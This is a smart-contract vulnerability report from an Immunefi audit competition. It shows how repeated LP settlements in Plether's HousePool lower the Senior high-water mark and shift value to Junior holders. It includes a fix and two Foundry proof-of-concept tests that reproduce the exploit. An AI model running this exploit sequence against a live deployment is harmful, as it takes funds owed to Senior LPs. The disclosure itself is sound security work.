# \#97860 [SC-High] Residual recapitalization re-runs the empty bootstrap on every LP settlement, lowering the Senior high-water mark with no loss and shifting Senior recovery to Junior

**Submitted on Nov 3rd 2026 at 16:27:02 UTC by @Nyko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97860
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

After a terminal deficit, the documented recovery is an owner recapitalization followed by `clearDegradedMode`. When the first LP settlement can only settle part of the recapitalization, the rest stays in `pendingRecapitalizationAssets`. Every later settlement caps that residual against the **whole** distributable value, which already backs the principal booked by the first settlement. It then books all claimed principal as a loss at an unchanged price and re-runs the "zero claimed principal" bootstrap with the **shrinking residual** as the Senior high-water mark. Each ordinary hourly settlement therefore lowers the Senior high-water mark with no new loss. When prices recover, the value the high-water mark should have restored to Senior LPs, plus the owner's leftover recapitalization, goes to Junior shareholders. Any address can drive the settlements.

## Vulnerability Details

1. Each reconcile caps the pending buckets against the total distributable value (`HousePool.sol:1829-1834`):

```solidity
return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```

2. The plan subtracts the settleable part from distributable before comparing it with the claimed principal (`HousePoolReconcilePlanLib.sol:68-71`), so when the residual is at least the distributable value, the principal already booked appears unbacked and `absorbLoss` charges all of it (`:87-103`):

```solidity
snapshot.distributable =
    snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
```

3. With both principals now zero, the live path applies the buckets (`HousePool.sol:1769-1771`), passing the current, already reduced bucket as the "intent", and the bootstrap branch overwrites the high-water mark (`HousePoolPendingPreviewLib.sol:118-121`):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
```

On the first settlement after the recapitalization this is the intended bootstrap: the high-water mark becomes the full recapitalization (NatSpec at `:104-110`, "Full recapitalization intent used as the high-water mark on an empty bootstrap"). On every later settlement the same branch runs again with the residual, so the high-water mark falls by the amount settled in the previous pass, while Senior principal and the price do not change.

This contradicts:
- `ACCOUNTING_SPEC.md:337`: "Charge a shortfall to Junior first, then Senior. Losses do not reduce the Senior high-water mark." Here the high-water mark falls without any loss.
- The response to Cecuro MED-12 (fixed in f852f969): "Recapitalization remains senior-first; partial-settlement residuals stay reserved". The residual does not stay reserved; each pass consumes the principal it already backs.
- The team's own scenario in `HousePoolWaterfall.t.sol` (`test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual`), which asserts "Residual recap should preserve senior's recovery target" and, once the claim is cleared, "Residual recap should settle once backing becomes available" (Senior principal 100,000). Adding one `reconcile()` while the claim is still outstanding lowers the high-water mark from 100,000 to 50,040; at the end Senior principal is 50,040 instead of 100,000 and 49,880 of the recapitalization becomes Junior principal (PoC test 2).

Who can trigger it: LP settlements run hourly on the Router route (`OrderRouter.settleLpEpoch`, any keeper) whenever LP work is queued; a Junior holder can queue a zero-value full-balance redemption each hour, which is refunded and counts as progress. During the frozen window any address can call `HousePool.settleLpEpoch(0, 0)` hourly with the cached mark, no Pyth payload needed. The condition at each settlement is: residual >= distributable value, which holds while the winning position that caused the deficit stays open.

Preconditions: the regime described in SECURITY.md "Explicit terminal-deficit cascade" (actual negative terminal LP equity), followed by the documented recovery ("4. Recapitalize or clear positions. 5. Clear degraded mode only after raw solvency E >= L is genuinely restored"). Reaching actual negative LP equity needs a large basket swing, because opens are gated by E >= L + B: measured at release parameters, a first leg to 0.50 then a second leg above 1.76 (or 0.80 then 1.91). The issue is therefore conditional on this documented stress regime, like MED-12. Once in it, the documented minimum recapitalization (restore E >= L) leaves a residual. No document states a recapitalization size that avoids the issue; by execution it needs more than about 1.87 times the documented minimum, or closing the winning positions first. The guardian LP settlement hold only delays it: the second settlement after the hold is released lowers the high-water mark. This is the same regime as Cecuro MED-12, which was accepted and fixed.

## Impact Details

Value that the waterfall owes to Senior LPs (restoration up to the high-water mark from future pool revenue) and the owner's leftover recapitalization are transferred to Junior shareholders, who can withdraw it. There is no reversal: once lowered, the high-water mark is never raised back.

PoC figures (test 1: release parameters; Junior 600k, Senior 400k; the owner recapitalizes exactly the documented minimum, 348,804.89 USDG, then clears degraded mode):
- Senior high-water mark after the 1st / 2nd / 3rd hourly settlement at the same 1.95 mark: 348,804.89 / 303,804.89 / 258,804.89.
- After the basket returns to 1.00: Senior 258,804.89 instead of 348,804.89 (-90,000); Junior +180,000 (Senior's loss plus 90,000 of the owner's recapitalization that otherwise stays unassigned). Junior LP A's exit: 214,369.45 instead of 124,369.59.

At release scale (Senior filled to the 40M cap, Junior 10M, 1 USDG seeds), a Junior holder who drives four hourly settlements gains 28,190,343 USDG against the control run: 13,000,000 from Senior LPs and 15,190,343 of the owner's recapitalization. Wiped Junior shares are freely transferable and quote at 0 (`TrancheVault.sol:325-331`), so they can be acquired at no cost before the recovery. The cost is the settlement calls.

Selected impact: High, "Theft of unclaimed yield" (Senior's entitled restoration from future revenue is taken by Junior holders). The transfer is attacker-profitable and permanent.

## Recommended fix

Cap the settleable buckets by the value not already backing claimed principal:

```solidity
uint256 claimed = seniorPrincipal + juniorPrincipal;
uint256 free = reconcileSnapshot.distributable > claimed ? reconcileSnapshot.distributable - claimed : 0;
return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, free);
```

(and the same in the preview path), or persist the bootstrap high-water mark target across passes and skip the bootstrap branch when the zero principal is created by the bucket reservation itself.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1771
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L103
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L104-L121
- ACCOUNTING_SPEC.md:337; SECURITY.md:1499-1511; Cecuro MED-12 response (fix f852f969); PRE-20 fix plether-core#29 (cap on pending claimant buckets)

## Proof of Concept

## Proof of Concept

Two Foundry tests at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8. No in-scope contract is modified.

Steps:

1. Save both files below in `packages/perps/test/perps/poc/`.
2. Run from the repository root:
   - `forge test --root packages/perps --match-test test_SameMarkSettlementsLowerSeniorHwm -vv`
   - `forge test --root packages/perps --match-test test_ExtraReconcileBeforeBackingReturnsLowersSeniorHwm -vv`
   (`FOUNDRY_VIA_IR=false` compiles faster; the results are identical under the default via-IR profile.)
3. Expected: both pass.

Test 1 (`RecapResidualRatchetCompact.t.sol`), end to end on the repo's `BasePerpTest` at the release parameters. Every trade is `OrderRouter.commitOrder` + `executeOrder` by a keeper, every LP settlement with positions is `OrderRouter.settleLpEpoch`, and the only owner actions are the documented minimum `recapitalizePool(L - (assets - claims))` and `clearDegradedMode`. MockPyth only supplies price updates. Output:

```
HWM r1 (= recap) / r2 / r3, atoms 348804893059 303804893059 258804893059
Senior after recovery: control / ratchet 348804893059 258804893059
Junior after recovery: control / ratchet 248739603695 428739603715
LP A exit: control / ratchet 124369594883 214369445123
```

Test 2 (`TeamScenarioExtraReconcile.t.sol`) is the team's own scenario `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual` (same helpers and amounts) with one additional `reconcile()` while the trader claim is still outstanding. The team test expects Senior principal 100,000 once backing returns; with the extra reconcile:

```
after reconcile 1: HWM: 100000.000000
after reconcile 2: HWM: 50040.000000
final Senior principal (team expects 100,000): 50040.000000
final Junior principal: 49880.000000
```

### Test 1: RecapResidualRatchetCompact.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Plether perps @ a82d4fe, release params, public Router trades/settlements only (MockPyth payloads, no burn/storage
// writes). Hedged pair; LONG wins at 0.50 (degraded); basket 1.95 (deficit). Owner does the documented minimum recovery:
// recapitalizePool(L - (assets - claims)) + clearDegradedMode. r1 bootstraps Senior HWM = full recap. Each later hourly
// settlement at the SAME mark caps the residual recap against total distributable (HousePool.sol:1833), books all
// principal as loss and re-bootstraps HWM = shrunken residual (HousePoolPendingPreviewLib.sol:118-121). On recovery,
// Senior value and the owner's residual go to Junior. Control = same flow without the same-price settlements.

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract RecapResidualRatchetCompactTest is BasePerpTest {

    address constant KEEPER = address(0xC0FFEE);
    address constant LONG_T = address(0x10A6);
    address constant SHORT_T = address(0x5407);
    address constant SR = address(0x5E1);
    address constant JA = address(0x7A);
    address constant JB = address(0x7B);
    uint256 lastPub;
    OrderRouter r;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams(0.01e18, 0.4e18, 10, 20, 300, 500, 1e6, 10, 5000, 0);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        r = OrderRouter(address(router));
        IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
        c.adverseConfidenceMultiplierBps = 2500;
        c.minOpenNotionalAssets = 1000e6;
        c.positionProtectionTriggerBountyAssets = 200_000;
        _setRouterConfig(c);
        _setSeniorCapacity(40_000_000e6, 8000);
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);
        uint256 d = vm.getBlockTimestamp() / 1 days;
        uint256 a = (8 - (d + 4) % 7) % 7;
        vm.warp((d + (a == 0 ? 7 : a)) * 1 days + 6 hours); // Monday 06:00 UTC
    }

    function _pay(
        uint256 p
    ) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 t = vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate(BASE_PYTH_FEED_A, MockPyth.MockPrice(int64(int256(p)), 0, -8, t, lastPub));
        u[1] = MockPyth.FeedUpdate(BASE_PYTH_FEED_B, MockPyth.MockPrice(int64(int256(p)), 0, -8, t, lastPub));
        lastPub = t;
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _mark(
        uint256 p
    ) internal {
        bytes[] memory data = _pay(p);
        vm.prank(KEEPER);
        r.updateMarkPrice(data);
    }

    function _trade(
        address acct,
        bool close,
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin,
        uint256 p
    ) internal {
        OrderV3Types.OrderRequest memory q;
        q.clientOrderId = keccak256(abi.encode(acct, r.nextCommitId()));
        q.side = side;
        q.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
        q.marginDelta = margin;
        q.isClose = close;
        q.targetPrice = (side == CfdTypes.Side.LONG) != close ? 1 : CAP_PRICE;
        q.bounds = OrderV3Types.ExecutionBounds(
            uint64(vm.getBlockTimestamp() + 60),
            60,
            7,
            r.lifecycleBook().currentExecutionConfigHash(),
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            0,
            0,
            type(uint32).max
        );
        vm.prank(acct);
        uint64 id = r.commitOrder(q);
        bytes[] memory data = _pay(p);
        vm.prank(KEEPER);
        r.executeOrder(id, data);
    }

    function _lp(
        TrancheVault v,
        address lp,
        uint256 amt
    ) internal {
        settlementToken.mint(lp, amt);
        vm.startPrank(lp);
        settlementToken.approve(address(v), amt);
        uint256 id = v.requestDeposit(amt, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(id));
        pool.settleLpEpoch(0, 0); // no positions yet: permissionless
        vm.prank(lp);
        v.claimDeposit(id, amt, lp, lp);
    }

    /// @dev Hourly Router settlement; queue progress = LP's worthless full-balance Junior exit (refunded).
    function _settle(
        address lp,
        uint256 refundOf,
        uint256 p
    ) internal returns (uint256 id) {
        if (refundOf != 0) {
            vm.prank(lp);
            juniorVault.claimRedeemRefund(refundOf, lp, lp);
        }
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 10 minutes);
        uint256 sh = juniorVault.balanceOf(lp);
        vm.prank(lp);
        id = juniorVault.requestRedeem(sh, lp, lp);
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours);
        bytes[] memory data = _pay(p);
        vm.prank(KEEPER);
        r.settleLpEpoch(data);
    }

    function test_SameMarkSettlementsLowerSeniorHwm() public {
        _mark(1e8);
        _lp(juniorVault, JA, 300_000e6);
        _lp(juniorVault, JB, 300_000e6);
        _lp(seniorVault, SR, 400_000e6);
        _fundTrader(LONG_T, 400_000e6);
        _fundTrader(SHORT_T, 1_000_000e6);
        for (uint256 i; i < 3; ++i) {
            _trade(LONG_T, false, CfdTypes.Side.LONG, 3000, 100_000e6, 1e8);
            _trade(SHORT_T, false, CfdTypes.Side.SHORT, 3000, 300_000e6, 1e8);
        }
        _mark(0.5e8);
        _trade(LONG_T, true, CfdTypes.Side.LONG, 9000, 0, 0.5e8);
        assertTrue(engine.degradedMode());
        _mark(1.95e8);
        uint256 recap = _maxLiability() - (pool.totalAssets() - engine.totalTraderClaimBalanceAssets());
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        engine.clearDegradedMode();

        uint256 reqA = _settle(JA, 0, 1.95e8); // r1
        uint256 h1 = pool.seniorHighWaterMark();
        uint256 s1 = pool.seniorPrincipal();
        assertEq(h1, recap, "r1 HWM = full recap");
        uint256 snap = vm.snapshotState();
        uint256[3] memory ctl = _recover(reqA);
        vm.revertToState(snap);

        uint256 reqB = _settle(JB, 0, 1.95e8); // r2, same mark
        uint256 h2 = pool.seniorHighWaterMark();
        assertEq(pool.seniorPrincipal(), s1, "no new loss");
        assertLt(h2, h1, "r2 lowers HWM");
        reqA = _settle(JA, reqA, 1.95e8); // r3, same mark
        uint256 h3 = pool.seniorHighWaterMark();
        assertLt(h3, h2, "r3 lowers HWM");
        reqB;
        uint256[3] memory rat = _recover(reqA);

        console2.log("HWM r1 (= recap) / r2 / r3, atoms", h1, h2, h3);
        console2.log("Senior after recovery: control / ratchet", ctl[0], rat[0]);
        console2.log("Junior after recovery: control / ratchet", ctl[1], rat[1]);
        console2.log("LP A exit: control / ratchet", ctl[2], rat[2]);
        assertLt(rat[0], ctl[0], "Senior loses");
        assertGt(rat[1], ctl[1], "Junior gains");
        assertGt(rat[2], ctl[2], "LP A exits with more");
    }

    /// @dev Basket back to 1.00, SHORT closes flat, next settlement funds LP A's exit: [Senior, Junior, A's exit].
    function _recover(
        uint256 refundOf
    ) internal returns (uint256[3] memory o) {
        _mark(1e8);
        _trade(SHORT_T, true, CfdTypes.Side.SHORT, 9000, 0, 1e8);
        uint256 id = _settle(JA, refundOf, 1e8);
        o[2] = juniorVault.claimableRedeemAssets(id, JA);
        o[0] = pool.seniorPrincipal();
        o[1] = pool.juniorPrincipal() + o[2];
    }

}
```

### Test 2: TeamScenarioExtraReconcile.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolWaterfallTest} from "../accounting/waterfall/HousePoolWaterfall.t.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// The team's own scenario test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual
/// (HousePoolWaterfall.t.sol), with ONE extra reconcile while the trader claim is still outstanding.
/// The team test ends with Senior principal == 100,000 ("Residual recap should settle once backing becomes available").
contract TeamScenarioExtraReconcileTest is HousePoolWaterfallTest {
    function test_ExtraReconcileBeforeBackingReturnsLowersSeniorHwm() public {
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();

        uint256 pendingAmount = 100_000e6;
        uint256 traderClaimLiability = 50_040e6;

        settlementToken.mint(address(pool), pendingAmount);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            pendingAmount, IHousePool.ClaimantInflowKind.Recapitalization, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        _setTotalTraderClaim(traderClaimLiability);

        vm.prank(address(seniorVault));
        pool.reconcile();
        assertEq(pool.seniorHighWaterMark(), pendingAmount, "team assertion: residual preserves the recovery target");
        emit log_named_decimal_uint("after reconcile 1: HWM", pool.seniorHighWaterMark(), 6);

        // The only change to the team scenario: one more reconcile, same state, same price, no new loss.
        vm.prank(address(seniorVault));
        pool.reconcile();
        emit log_named_decimal_uint("after reconcile 2: HWM", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("after reconcile 2: Senior principal", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("after reconcile 2: pending recap", pool.pendingRecapitalizationAssets(), 6);

        // Backing becomes available, as in the team test.
        _setTotalTraderClaim(0);
        vm.prank(address(seniorVault));
        pool.reconcile();
        emit log_named_decimal_uint("final Senior principal (team expects 100,000)", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("final unassigned", pool.unassignedAssets(), 6);
        emit log_named_decimal_uint("final Junior principal", pool.juniorPrincipal(), 6);

        assertLt(pool.seniorHighWaterMark(), pendingAmount, "extra reconcile lowered the Senior recovery target");
        assertLt(pool.seniorPrincipal(), pendingAmount, "Senior no longer restored to the full recapitalization");
    }
}
```

